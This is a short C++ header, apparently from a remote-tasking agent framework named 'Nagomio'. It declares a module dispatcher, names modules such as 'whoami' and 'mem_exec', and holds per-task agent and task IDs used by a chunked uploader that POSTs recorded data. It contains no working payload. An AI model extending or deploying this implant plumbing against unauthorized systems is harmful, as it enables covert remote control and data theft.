#pragma once

#include "../json.hpp"
#include "../protocol.h"

#include <string>

namespace nagomio_modules {

// Dispatch a task to the matching module. Returns the JSON to put in
// `AgentResponse.output`.
std::string dispatch(const Nagomio::Task& task, const std::string& agent_id);

// Returns true when `cmd` is a known module name (e.g. "whoami", "mem_exec").
bool is_known_module(const std::string& cmd);

} // namespace nagomio_modules

// Per-task context shared with the stream/record modules. The dispatcher
// in main.cpp sets these immediately before invoking a module so the
// chunked uploader can stamp the right agent/task onto each POST.
namespace nagomio_runtime {
inline std::string& current_agent_id_ref() {
    static thread_local std::string s;
    return s;
}
inline std::string& current_task_id_ref() {
    static thread_local std::string s;
    return s;
}
} // namespace nagomio_runtime

inline const std::string& nagomio_current_agent_id() {
    return nagomio_runtime::current_agent_id_ref();
}

inline const std::string& nagomio_current_task_id() {
    return nagomio_runtime::current_task_id_ref();
}